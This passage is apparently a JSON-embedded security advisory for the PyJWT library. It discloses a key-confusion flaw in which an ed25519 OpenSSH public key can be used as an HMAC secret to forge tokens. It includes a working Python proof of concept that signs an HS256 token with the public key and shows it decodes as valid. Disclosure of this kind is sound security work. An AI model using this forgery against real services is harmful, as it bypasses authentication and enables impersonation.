  "details": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nDisclosed by Aapo Oksman (Senior Security Specialist, Nixu Corporation).\n\n> PyJWT supports multiple different JWT signing algorithms. With JWT, an \n> attacker submitting the JWT token can choose the used signing algorithm.\n> \n> The PyJWT library requires that the application chooses what algorithms \n> are supported. The application can specify \n> \"jwt.algorithms.get_default_algorithms()\" to get support for all \n> algorithms. They can also specify a single one of them (which is the \n> usual use case if calling jwt.decode directly. However, if calling \n> jwt.decode in a helper function, all algorithms might be enabled.)\n> \n> For example, if the user chooses \"none\" algorithm and the JWT checker \n> supports that, there will be no signature checking. This is a common \n> security issue with some JWT implementations.\n> \n> PyJWT combats this by requiring that the if the \"none\" algorithm is \n> used, the key has to be empty. As the key is given by the application \n> running the checker, attacker cannot force \"none\" cipher to be used.\n> \n> Similarly with HMAC (symmetric) algorithm, PyJWT checks that the key is \n> not a public key meant for asymmetric algorithm i.e. HMAC cannot be used \n> if the key begins with \"ssh-rsa\". If HMAC is used with a public key, the \n> attacker can just use the publicly known public key to sign the token \n> and the checker would use the same key to verify.\n> \n>  From PyJWT 2.0.0 onwards, PyJWT supports ed25519 asymmetric algorithm. \n> With ed25519, PyJWT supports public keys that start with \"ssh-\", for \n> example \"ssh-ed25519\".\n\n```python\nimport jwt\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.primitives.asymmetric import ed25519\n\n# Generate ed25519 private key\nprivate_key = ed25519.Ed25519PrivateKey.generate()\n\n# Get private key bytes as they would be stored in a file\npriv_key_bytes = \nprivate_key.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.PKCS8, \nencryption_algorithm=serialization.NoEncryption())\n\n# Get public key bytes as they would be stored in a file\npub_key_bytes = \nprivate_key.public_key().public_bytes(encoding=serialization.Encoding.OpenSSH,format=serialization.PublicFormat.OpenSSH)\n\n# Making a good jwt token that should work by signing it with the \nprivate key\nencoded_good = jwt.encode({\"test\": 1234}, priv_key_bytes, algorithm=\"EdDSA\")\n\n# Using HMAC with the public key to trick the receiver to think that the \npublic key is a HMAC secret\nencoded_bad = jwt.encode({\"test\": 1234}, pub_key_bytes, algorithm=\"HS256\")\n\n# Both of the jwt tokens are validated as valid\ndecoded_good = jwt.decode(encoded_good, pub_key_bytes, \nalgorithms=jwt.algorithms.get_default_algorithms())\ndecoded_bad = jwt.decode(encoded_bad, pub_key_bytes, \nalgorithms=jwt.algorithms.get_default_algorithms())\n\nif decoded_good == decoded_bad:\n     print(\"POC Successfull\")\n\n# Of course the receiver should specify ed25519 algorithm to be used if \nthey specify ed25519 public key.
